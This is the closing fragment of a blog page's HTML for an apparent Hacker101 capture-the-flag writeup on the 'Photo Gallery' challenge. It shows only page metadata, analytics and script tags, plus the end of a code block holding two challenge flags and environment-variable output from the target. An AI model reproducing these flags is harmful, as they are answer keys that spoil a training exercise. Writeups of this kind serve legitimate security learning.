HTTP/1.1`\n\n```bash\n\"^FLAG^9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa$FLAG$\"\n\"^FLAG^63a407d0083bf2aedd862d762fcf96e8a7f8bf751e1ac24bec781a74564ee9f2$FLAG$\"\nHOSTNAME=ad3e8c7df92d\nSHLVL=0\n```\n"}},"__N_SSG":true},"page":"/blog/[blog]","query":{"blog":"hacker101-ctf-photo-gallery"},"buildId":"hBiPyyp83XL8p-qjIdRWi","nextExport":false,"isFallback":false,"gsp":true,"head":[["meta",{"name":"viewport","content":"width=device-width"}],["meta",{"charSet":"utf-8"}],["script",{"async":true,"src":"https://www.googletagmanager.com/gtag/js?id=G-TZ2VB384DV","className":"jsx-2179548495"}],["script",{"dangerouslySetInnerHTML":{"__html":"\n              window.dataLayer = window.dataLayer || [];\n              function gtag(){dataLayer.push(arguments);}\n              gtag('js', new Date());\n\n            gtag('config', 'G-TZ2VB384DV');\n            "},"className":"jsx-2179548495"}],["title",{"children":"Hacker101 CTF Photo Gallery writeup"}],["meta",{"name":"copyright","content":"lwlx. 2020"}],["link",{"rel":"canonical","href":"https://dev.lwlx.xyz/blog/hacker101-ctf-photo-gallery"}],["meta",{"name":"description","content":"A write up for the Photo Gallery [moderae] challenge"}],["meta",{"property":"og:type","content":"website"}],["meta",{"name":"og:title","property":"og:title","content":"Hacker101 CTF Photo Gallery writeup"}],["meta",{"name":"og:description","property":"og:description","content":"A write up for the Photo Gallery [moderae] challenge"}],["meta",{"property":"og:site_name","content":"dev.lwlx.xyz"}],["meta",{"property":"og:url","content":"https://dev.lwlx.xyz/blog/hacker101-ctf-photo-gallery"}],["meta",{"name":"twitter:card","content":"summary_large_image"}],["meta",{"name":"twitter:title","content":"Hacker101 CTF Photo Gallery writeup"}],["meta",{"name":"twitter:description","content":"A write up for the Photo Gallery [moderae] challenge"}],["meta",{"name":"twitter:site","content":"@0x0000005"}],["meta",{"name":"twitter:creator","content":"@0x0000005"}],["meta",{"name":"twitter:image","content":"https://dev.lwlx.xyz/hackerone/hackerone.png"}],["meta",{"property":"og:image","content":"https://dev.lwlx.xyz/hackerone/hackerone.png"}]]}</script><script nomodule="" src="/_next/static/chunks/polyfills-fa276ba060a4a8ac7eef.js"></script><script src="/_next/static/chunks/main-8b739faffb921dc9003b.js" async=""></script><script src="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" async=""></script><script src="/_next/static/chunks/framework.9307f483d5f18bd6c60f.js" async=""></script><script src="/_next/static/chunks/f6078781a05fe1bcb0902d23dbbb2662c8d200b3.7fdc3fdfd8639afdba2f.js" async=""></script><script src="/_next/static/chunks/dd48059e07d9e613287d2b9ed68ceff9c6eda536.68cdf0c5bb973a7bf1ba.js" async=""></script><script src="/_next/static/chunks/pages/_app-c9314fadf4ee6195d8c6.js" async=""></script><script src="/_next/static/chunks/d906b6fe61298877255aebd66977199bd89a78bb.2ef5a9e4af48b2c5c21e.js" async=""></script><script src="/_next/static/chunks/pages/blog/%5Bblog%5D-16f9a6366aaee6d7fa83.js" async=""></script><script src="/_next/static/hBiPyyp83XL8p-qjIdRWi/_buildManifest.js" async=""></script><script src="/_next/static/hBiPyyp83XL8p-qjIdRWi/_ssgManifest.js" async=""></script></body></html>